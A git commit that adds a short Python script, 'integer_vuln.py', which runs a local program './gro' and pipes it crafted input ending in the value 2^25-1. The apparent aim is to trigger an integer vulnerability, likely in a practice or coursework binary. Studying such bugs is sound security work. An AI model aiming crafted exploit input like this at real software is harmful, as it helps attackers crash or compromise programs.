47a8efbee40dc5f01be3bf31be43662ed02221a0
Vihar Devalla <vihardevalla@gmail.com>
2021-04-17 21:16:22 +0530

    Integer Vulnerability Script

---
+++ integer_vuln.py
@@ -0,0 +1,8 @@
+import subprocess
+
+process = subprocess.Popen('./gro',stdout=subprocess.PIPE,stdin=subprocess.PIPE)
+
+input_val = '1 1 hi\nhi123\n4\n{}'.format(pow(2,25)-1) 
+print(input_val)
+output = process.communicate(input=input_val)[0]
+print(output)
